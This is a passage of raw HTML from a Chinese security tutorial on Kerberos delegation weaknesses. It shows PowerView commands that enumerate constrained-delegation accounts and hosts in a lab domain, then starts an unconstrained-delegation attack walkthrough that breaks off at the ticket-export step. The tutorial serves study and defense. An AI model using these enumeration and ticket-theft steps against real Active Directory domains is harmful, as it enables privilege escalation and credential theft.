style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Import</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Module</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">\powerview</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ps1</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">;</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">查询域中配置约束委派的账号</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Get</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">DomainUser</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">TrustedToAuth</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Domain</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">0day</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">org </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">|</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">select</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> name</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">或</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Get</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">DomainUser</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">TrustedToAuth</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Properties</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> distinguishedname</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">,</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">useraccountcontrol</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">,</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">msds</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">allowedtodelegateto</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">|</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> fl</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">查询域中配置约束委派的主机</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Get</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">DomainComputer</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">TrustedToAuth</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Domain</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">0day</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">org </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">|</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">select</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> name</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">或</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Get</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">DomainComputer</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">TrustedToAuth</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Properties</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> distinguishedname</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">,</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">useraccountcontrol</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">,</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">msds</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">allowedtodelegateto</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">|</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ft </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Wrap</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">AutoSize</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.43528283796740175" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/44_e4ROE0sJRe8JsnK3M8wibb8fVdPz9w.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIXRCIvUoPia79yiay6lL3UtgHRdhe4ROE0sJRe8JsnK3M8wibb8fVdPz9w/640?wx_fmt=png'" data-type="png" data-w="1043" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br  /></p><h2 style="margin: 4em auto 2em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: center;color: rgb(255, 255, 255);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.2em;font-weight: bold;display: table;padding-right: 0.2em;padding-left: 0.2em;background: rgb(15, 76, 129);">查询某用户是否具有委派性</h2><section class="code-snippet__github" style=" margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0); white-space: normal; "><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Import</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Module</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">\powerview</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ps1</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">;</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Get</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">DomainUser</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">域用户名</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Properties</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">  useraccountcontrol</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">,</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">msds</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">allowedtodelegateto</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">|</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> fl</span></span></code></pre></section><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">当该账号没委派属性时，查询不出任何信息<br style="-webkit-tap-highlight-color: transparent;"  /></p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">当服务账号被设置为&nbsp;**非约束性委派&nbsp;**时，其 userAccountControl 属性会包含为&nbsp;TRUSTED_FOR_DELEGATION<br style="-webkit-tap-highlight-color: transparent;"  /></p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">当被设置为&nbsp;**约束性委派&nbsp;**时，其userAccountControl属性包含 TRUSTED_TO_AUTH_FOR_DELEGATION，且 msds-allowedtodelegateto 属性会被设置为哪些 SPN。<br style="-webkit-tap-highlight-color: transparent;"  /><br style="-webkit-tap-highlight-color: transparent;"  /></p><h2 style="margin: 4em auto 2em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: center;color: rgb(255, 255, 255);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.2em;font-weight: bold;display: table;padding-right: 0.2em;padding-left: 0.2em;background: rgb(15, 76, 129);">非约束委派攻击</h2><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br style="-webkit-tap-highlight-color: transparent;"  />非约束委派：当user访问service1时，如果service1的服务账号开启了<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">unconstrained delegation</code>（非约束委派），则当<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">user</code>访问<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">service1</code>时会将user的<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">TGT</code>发送给<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">service1</code>并保存在内存中以备下次重用，然后<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">service1</code>&nbsp;就可以利用这张<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">TGT</code>以user的身份去访问域内的任何服务（任何服务是指user能访问的服务）了<br style="-webkit-tap-highlight-color: transparent;"  /></p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">操作环境：</p><p style="-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;padding-left: 1em;list-style: circle;"><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;line-height: 1.75;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span>域：0day.org</span><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;line-height: 1.75;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span>域控：windows server 2008R2，主机名：OWA2010SP3，IP：<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">192.168.3.142</code></span><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;line-height: 1.75;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span>域管账户：sqladmin</span><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;line-height: 1.75;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span>域内主机：windows 8，主机名：PC-mary-0day，IP：192.168.3.63，用户：mary(普通域用户)</span></p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><strong style="-webkit-tap-highlight-color: transparent;color: rgb(15, 76, 129);line-height: 1.75;"></strong></p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><strong style="-webkit-tap-highlight-color: transparent;color: rgb(15, 76, 129);line-height: 1.75;">注</strong>：在Windows系统中，只有服务账号和主机账号的属性才有委派功能，普通用户默认是没有的<br style="-webkit-tap-highlight-color: transparent;"  /><br style="-webkit-tap-highlight-color: transparent;"  /></p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br  /></p><h3 style="margin-top: 2em;margin-right: 8px;margin-bottom: 0.75em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.2;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.1em;font-weight: bold;padding-left: 8px;border-left: 3px solid rgb(15, 76, 129);">1.查找非约束委派主机账号</h3><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.16601178781925344" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/45_rw14qxdIUicskLzZ1cjvmuLty76eRQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIurd1V39n2XNkMxoIz6RwDNWZ2rw14qxdIUicskLzZ1cjvmuLty76eRQ/640?wx_fmt=png'" data-type="png" data-w="1018" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br  /></p><h3 style="margin-top: 2em;margin-right: 8px;margin-bottom: 0.75em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.2;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.1em;font-weight: bold;padding-left: 8px;border-left: 3px solid rgb(15, 76, 129);">2.导出票据</h3><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">先访问域控，可以看到是访问失败的<br style="-webkit-tap-highlight-color: transparent;"  /></p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.20473372781065088" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/46_CQRtBcXN54lOREcicBrM8IpdibdeHw.png" 